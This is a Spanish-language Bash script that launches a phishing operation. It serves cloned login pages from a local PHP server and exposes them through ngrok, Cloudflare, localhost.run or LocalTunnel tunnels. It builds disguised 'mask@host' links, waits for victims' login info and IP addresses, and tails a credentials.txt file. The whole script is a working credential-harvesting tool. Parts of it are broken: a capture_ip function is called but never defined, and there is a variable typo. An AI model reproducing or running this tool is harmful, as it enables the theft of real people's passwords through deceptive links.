#!/bin/bash
clear
ex() {
clear
echo -e "[*] (Tecla X = x ) Detectado, Saliendo... " | lolcat
sleep 2
echo -e "[*] Deteniendo el Servicio... " | lolcat
sleep 2
echo -e "[*] Deteniendo Herramientas... " | lolcat
sleep 2
echo -e "[*] Deteniendo Procesadores... " | lolcat
sleep 1
echo " "
echo -e "$grn
____  _  _  ____    ____  _  _  ___
(  _ \( \/ )( ___)  (  _ \( \/ )( ___)
 ) _ < \  /  )__)    ) _ < \  /  )__)
(____/ (__) (____)  (____/ (__) (____)..."| lolcat
echo " "
echo " "
sleep 2
echo '
 ----------------------------------
| NOS DA PENA QUE NOS DEJE CUIDASE |     
 ---------------------------------- 
 '| lolcat -a -d 20
echo && sleep 5
exit
}
## Remove logfile
if [[ -e ".server/.cld.log" ]]; then
	rm -rf ".server/.cld.log"
fi
# detect ctrl+c exiting
trap ctrl_c INT
ctrl_c() {
clear
kill_pid
ex
exit
}
########### DETENER LOS PROCESOS #####################
kill_pid() {
	check_PID="php ngrok cloudflared loclx"
	for process in ${check_PID}; do
		if [[ $(pidof ${process}) ]]; then # Check for Process
			killall ${process} > /dev/null 2>&1 # Kill the Process
		fi
	done
}
########### FIN DETENER LOS PROCESOS #####################

########### INICIA CODIGO DE COLORES #######################
color(){
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
orange='\033[40m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
Gris='\033[0;37m'
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Er5scape}[36m";
Reset="${Escape}[0m";
pe='\033[0;35m'
#-----------------
}
#-----------------
red='\033[1;31m'
rset='\033[0m'
grn='\033[1;32m'
orange='\033[40m'
ylo='\033[1;33m'
blue='\033[1;34m'
cyan='\033[1;36m'
pink='\033[1;35m'
Gris='\033[0;37m'
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
Escape="\033";
white="${Escape}[0m";
GreenF="${Escape}[32m";
LighGreenF="${Escape}[92m"
YellowF="${Escape}[33m";
BlueF="${Escape}[34m";
CyanF="${Er5scape}[36m";
Reset="${Escape}[0m";
pe='\033[0;35m'
negro="\e[1;30m"
azul="\e[1;34m"
verde="\e[1;32m"
cian="\e[1;36m"
rojo="\e[1;31m"
purpura="\e[1;35m"
amarillo="\e[1;33m"
blanco="\e[1;37m"
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
########### FIN CODIGO DE COLORES #######################

############# CODIGO DE LOGO ###################
logo(){
echo '	
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
┃ ╔███╗  ╔███╗ ╔█████╗ ╔██████╗  ╔███████╗     ┃
┃ ║██║║██║║██║ ██╔══██╗║██║  ║██ ║██╔════      ┃
┃ ║██║║██║║██║ ███████║║██║  ║██ ║███████║     ┃ 
┃ ║██║╚══╝║██║ ██╔══██║║██║  ║██ ║██╔════      ┃
┃ ║██║    ║██║ ██║  ██║║██████║  ║███████║     ┃
┃ ╚══╝    ╚══╝ ╚═╝  ╚═╝╚══════╝  ╚═══════╝V2.5 ┃
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
'| lolcat -a -d 4
echo -e -n "${verde}
        ┌═══════════════┐
        █${blanco}  AUTOR LUIGUI${verde} █
        └═══════════════┘
"${blanco}
color 
}
############# FIN CODIGO DE LOGO ###################

############### INICIA CODIGO DE EJECUCION DE INICIO Y ORDENES###########################
start1() {
logo
color 
echo -e -n "${yellow}
╔━━━━━━━━━━━━━━━━━━━━━━━━━╗    ╔━━━━━━━━━━━━━━━━━━━━━━━━╗${yellow}
┃ $grn [1] $blanco  localhost.run    ${yellow}┃    ┃ $grn [2] $blanco Localhost  PHP   ${yellow}┃
╔━━━━━━━━━━━━━━━━━━━━━━━━━╗    ╔━━━━━━━━━━━━━━━━━━━━━━━━╗${yellow}   
┃ $grn [3] $blanco  Ngrok            ${yellow}┃    ┃ $grn [4] $blanco Cloudflare       ${yellow}┃
╚━━━━━━━━━━━━━━━━━━━━━━━━━╝    ╚━━━━━━━━━━━━━━━━━━━━━━━━╝${yellow}
╔━━━━━━━━━━━━━━━━━━━━━━━━━╗    ╔━━━━━━━━━━━━━━━━━━━━━━━━╗${yellow}   
┃ $grn [5] $blanco LocalTunnel       ${yellow}┃    ┃ $grn [6] $blanco Volver al Inicio ${yellow}┃
╚━━━━━━━━━━━━━━━━━━━━━━━━━╝    ╚━━━━━━━━━━━━━━━━━━━━━━━━╝${yellow}
"${blanco}
default_option_server="1"
echo -e -n "${rojo}
     ┌═══════════════┐
     █${blanco}Ingresa opcion${rojo} █
     └═══════════════┘
"${blanco}
read -p $'\e[1;31m     └──╼\e[0m\e[1;92m '  option_server
option_server="${option_server:-${default_option_server}}"
if [[   $option_server -eq 1 ]]; then
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la carpeta:\e[0m""\e[1;31m]\e[0m" 
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var1
server1
elif [[ $option_server -eq 2 ]]; then
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la carpeta:\e[0m""\e[1;31m]\e[0m" 
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var2
localhost
elif [[ $option_server -eq 3 ]]; then
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la carpeta:\e[0m""\e[1;31m]\e[0m" 
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var3
website=$my_var3
start_ngrok
elif [[ $option_server -eq 4 ]]; then
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa la carpeta:\e[0m""\e[1;31m]\e[0m" 
read -p $'\e[1;31m└──╼\e[0m\e[1;92m ' my_var4
website=$my_var4
start_cloudflared
elif [[ $option_server -eq 5 ]]; then
echo -e "\e[1;31m┌─[\e[0m""\e[1;37mIngresa el nombre de la carpeta:\e[0m""\e[1;31m]\e[0m" 
read -p $'\e[1;31m└──╼\e[0m\e[1;37m ' my_var5
site=$my_var5
server2 
elif [[ $option_server -eq 6 ]]; then
./retornal.sh
clear
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
start1
fi
}
############### FIN DEL CODIGO DE EJECUCION DE INICIO Y ORDENES ##########################

################### CODIGO DE EJECUCION LOCALHOST RUN #####################
server1() {
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Iniciando LocalHostRun ...\e[0m\n"
cd $my_var1 && php -S 127.0.0.1:4545 > /dev/null 2>&1 & 
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Localhost...\e[0m\e[1;91m ( \e[0m\e[1;96mhttp://127.0.0.1:4545\e[0m\e[1;91m )\e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;93m Press Ctrl+C Buena suerte \e[0m\n"
sleep 1
printf "\e[0m\n"
printf " \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m"
ssh -R 80:localhost:4545 ssh.localhost.run
capture_data
}
####################### FIN DEL CODIGO DE EJECUCION DE LOCALHOSTRUN #####################################

##################### CODIGO DE EJECUCION PHP LOCALHOST ##########################
localhost(){
cd $my_var2
php -S "$HOST":"$PORT"
}
##################### FIN CODIGO DE EJECUCION PHP LOCALHOST ##########################

################ HOST Y EL PUERTO ################
HOST='127.0.0.1'
PORT='8080'
################ FIN DE HOST Y EL PUERTO ################
setup_site() {
	echo -e "\n${red}[${blanco}-${red}]${blue} Setting up server..."${blanco}
	cp -rf .sites/"$website"/* .server/www
	echo -ne "\n${red}[${blanco}-${RED}]${blue} Starting PHP server..."${blanco}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

#################### CODIGO NGROK ##################################
## Start ngrok
start_ngrok() {
	echo -e "\n${red}[${blanco}-${red}]${verde} Initializing... ${verde}( ${cyan}http://$HOST:$PORT ${verde})"
	{ sleep 1; setup_site; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Ngrok Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "Y" ]] && ngrok_region="sa" || ngrok_region="us"
	echo -e "\n\n${red}[${blanco}-${red}]${verde} Launching Ngrok..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/ngrok http --region ${ngrok_region} "$HOST":"$PORT" --log=stdout > /dev/null 2>&1 &
	fi
	{ sleep 8; clear; logo; }
	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -Eo '(https)://[^/"]+(ngrok-free.app)')
	ngrok_url1=${ngrok_url#https://}
	echo -e "\n${red}[${blanco}-${red}]${blue} URL 1 : ${verde}$ngrok_url"
	echo -e "\n${red}[${blanco}-${red}]${blue} URL 2 : ${verde}$mask@$ngrok_url1"
	capture_data
}
#################### FIN CODIGO NGROK ##################################

############### CODIGO PARA QUE ESTE ACTIVO EL NGROK EN LA PANTALLA ####################
capture_data() {
	echo -ne "\n${red}[${blanco}-${red}]${yellow} Waiting for Login Info, ${blue}Ctrl + C ${yellow}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
	done
}
############### FIN CODIGO PARA QUE ESTE ACTIVO EL NGROK EN LA PANTALLA ####################

################# INICIA CODIGO DE Cloudflared ######################
start_cloudflared() { 
    rm .server/.server/.cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.server/.cld.log > /dev/null 2>&1 &
	else
		sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .server/.server/.cld.log > /dev/null 2>&1 &
	fi

	{ sleep 8; clear; logo; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".server/.server/.cld.log")
	
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
	capture_data
}
################# FIN INICIA CODIGO DE Cloudflared ######################

################# INICIA CODIGO DE LocalTunnel######################
server2() {
if [[ -e $site/ip.txt ]]; then
rm -rf $site/ip.txt
fi
if [[ -e $site/usernames.txt ]]; then
rm -rf $site/usernames.txt
fi
printf "${Yellow}Starting ${BGreen}PHP ${Green}server\n"
cd $site && xterm -geometry 90x26+1000 -hold -T "PHP server" -e "php -S localhost:8000" > /dev/null 2>&1 &
sleep 5
printf "${BGreen}OK.${clear}\n"
printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server\n"
 xterm -hold -geometry 90x26+1000+1000 -l -lf xtermtunnel -T "LocalTunnel server ☣" -e "lt --port 8000 --subdomain $site-com --print-requests" > /dev/null 2>&1 & 
sleep 10
printf "${BGreen}OK.${clear}\n\n"
printf "${BYellow}Your URL is: ${BGreen} "&& cat xtermtunnel | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*'
printf "\n"
sleep 2
printf "Website: $site \n\n" > credentials.txt
xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f credentials.txt' > /dev/null 2>&1 &
sleep 1
capture_data
}
################# FIN INICIA CODIGO DE LocalTunnel ######################
start1
color

